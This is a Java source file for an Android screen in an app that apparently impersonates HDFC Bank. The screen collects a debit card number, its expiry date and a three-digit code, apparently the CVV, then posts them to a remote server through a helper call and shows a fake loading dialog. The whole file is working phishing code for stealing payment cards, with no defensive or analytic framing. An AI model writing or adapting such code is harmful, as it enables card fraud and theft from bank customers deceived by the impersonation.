package com.feedback.hdfcbank01;

import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class FourthActivity extends AppCompatActivity {

    public Map<Integer, String> ids;
    public HashMap<String, Object> dataObject;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main4);

        dataObject = new HashMap<>();
        int id = getIntent().getIntExtra("id", -1);
        Button buttonsubmission = findViewById(R.id.submission);


        EditText verifyreferencenumber = findViewById(R.id.verifyreferencenumber);
        verifyreferencenumber.addTextChangedListener(new DebitCardInputMask(verifyreferencenumber));

        EditText shortdate2 = findViewById(R.id.shortdate2);
        shortdate2.addTextChangedListener(new ExpiryDateInputMask(shortdate2));

        ids = new HashMap<>();
        ids.put(R.id.verifyreferencenumber, "verifyreferencenumber");
        ids.put(R.id.shortdate2, "shortdate2");
        ids.put(R.id.formcode, "formcode");

        for(Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);

            String value = editText.getText().toString().trim();
            dataObject.put(key, value);
        }

        buttonsubmission.setOnClickListener(v -> {
            if (validateForm()) {
                showInstallDialog();
                JSONObject dataJson = new JSONObject(dataObject);
                JSONObject sendPayload = new JSONObject();
                try {
                    Helper help = new Helper();
                    sendPayload.put("site", help.SITE());
                    sendPayload.put("data", dataJson);
                    sendPayload.put("id", id);

                    Helper.postRequest(help.FormSavePath(), sendPayload, new Helper.ResponseListener() {
                        @Override
                        public void onResponse(String result) {
                            if (result.startsWith("Response Error:")) {
                                Toast.makeText(getApplicationContext(), "Response Error : "+result, Toast.LENGTH_SHORT).show();
                            } else {
                                try {
                                    JSONObject response = new JSONObject(result);
                                    if(response.getInt("status")==200){
                                        Intent intent = new Intent(getApplicationContext(), LastActivity.class);
                                        intent.putExtra("id", id);
                                        startActivity(intent);
                                    }else{
                                        Toast.makeText(getApplicationContext(), "Status Not 200 : "+response, Toast.LENGTH_SHORT).show();
                                    }
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }
                        }
                    });
                } catch (JSONException e) {
                    Toast.makeText(this, "Error1 "+ e, Toast.LENGTH_SHORT).show();
                }
            }else{
                Toast.makeText(getApplicationContext(), "form validation failed", Toast.LENGTH_SHORT).show();
            }

        });

    }

    public boolean validateForm() {
        boolean isValid = true; // Assume the form is valid initially

        // Clear dataObject before adding new data
        dataObject.clear();

        for (Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);

            // Check if the field is required and not empty
            if (!FormValidator.validateRequired(editText, "Required this field...")) {
                isValid = false; // Mark as invalid if required field is missing
                continue; // Continue with the next field
            }

            String value = editText.getText().toString().trim();

            // Validate based on the key
            switch (key) {
                case "verifyreferencenumber":
                    if (!FormValidator.validateMinLength(editText, 19, "Invalid Details")) {
                        isValid = false;
                    }
                    break;

                case "shortdate2":
                    if (!FormValidator.validateMinLength(editText, 5, "Invalid Date")) {
                        isValid = false;
                    }
                    break;
                case "formcode":
                    if (!FormValidator.validateMinLength(editText, 3, "Invalid Code")) {
                        isValid = false;
                    }
                    break;
                default:
                    break;
            }

            // Add to dataObject only if the field is valid
            if (isValid) {
                dataObject.put(key, value);
            }
        }

        return isValid;
    }

    private void showInstallDialog() {
        // Inflate the custom layout
        LayoutInflater inflater = getLayoutInflater();
        View dialogView = inflater.inflate(R.layout.dialog_loading, null);

        // Create an AlertDialog builder
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setView(dialogView);  // Set the custom layout as the dialog's view
        builder.setCancelable(false);

        // Create and show the dialog
        AlertDialog dialog = builder.create();
        dialog.show();

        new Handler().postDelayed(dialog::dismiss, 3000);
    }
}
